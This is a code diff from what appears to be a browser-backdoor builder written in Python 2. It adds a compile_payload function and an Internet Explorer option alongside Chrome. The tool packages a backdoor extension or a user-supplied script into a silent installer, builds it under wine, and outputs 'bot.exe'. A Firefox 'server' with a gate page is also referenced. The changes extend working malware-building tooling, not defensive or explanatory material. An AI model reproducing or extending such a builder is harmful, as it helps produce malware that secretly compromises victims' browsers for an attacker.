@@ -167,8 +167,35 @@ def generate_xpi(information_array):
 	if user_input == '' or user_input == 'y' or user_input == 'Y':
 	    verify_xpi(information_array)
 
+def compile_payload(type):
+    if type == "--chrome":
+	payload_del = "installer/ch/test.crx"
+	old_folder = "installer/ch/"
+	new_folder = "installer/ch_bk/"
+    elif type == "--ie":
+	payload_del = "installer/ie/script.js"
+	old_folder = "installer/ie"
+	new_folder = "installer/ie_bk"
+    try:
+	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Starting installer..."
+	subprocess.call(["wine", "start", 'installer/build.cmd'])
+	walls = 0
+	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Waiting bot.exe"
+	time.sleep(20)
+	while walls == 0:
+	    if os.path.isfile('installer/setup.exe'):
+		copy('installer/setup.exe', 'bot.exe')
+		os.remove('installer/setup.exe')
+		os.remove(payload_del)
+		copy(old_folder,new_folder)
+		shutil.rmtree(old_folder)
+		walls = 1
+		print bcolors.OKGREEN+"Generate successful : "+os.getcwd()+"/bot.exe"+bcolors.ENDC
+    except:
+	print "["+bcolors.WARNING+"-"+bcolors.ENDC+"] Please install wine32"
+
 def executable_silent():
-    user_input = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] backdoor type (--chrome) ? ")
+    user_input = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] backdoor type (--chrome,--firefox,--ie) ? ")
     if user_input == "" or user_input == "--chrome":
 	action = 0
 	while action == 0:
@@ -179,23 +206,18 @@ def executable_silent():
 		os.rename('installer/ch_bk/','installer/ch/')
 		#backdoor_name = glob.glob('installer/ch/*.crx')[0]
 		#print backdoor_name
-		try:
-		    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Starting installer..."
-		    subprocess.call(["wine", "start", 'installer/build.cmd'])
-		    walls = 0
-		    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Waiting bot.exe"
-		    time.sleep(20)
-		    while walls == 0:
-			if os.path.isfile('installer/setup.exe'):
-			    copy('installer/setup.exe', 'bot.exe')
-			    os.remove('installer/setup.exe')
-			    os.remove('installer/ch/test.crx')
-			    copy('installer/ch/','installer/ch_bk/')
-			    shutil.rmtree('installer/ch/')
-			    walls = 1
-			    print bcolors.OKGREEN+"Generate successful : "+os.getcwd()+"/bot.exe"+bcolors.ENDC
-		except:
-		    print "["+bcolors.WARNING+"-"+bcolors.ENDC+"] Please install wine32"
+		compile_payload('--chrome')
+    elif user_input == "--ie":
+	action = 0
+	while action == 0:
+	    user_input = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] script file for ie payload (script.js) ? ")
+	    if user_input != "":
+		if os.path.isfile(user_input):
+		    action = 1
+		    copy(user_input,"installer/ie_bk/script.js")
+		    os.rename('installer/ie_bk/', 'installer/ie/')
+		    compile_payload('--ie')
+
 def install_firefox_server():
 	backdoor_information = {}
 	backdoor_information['gate'] = "index.php"
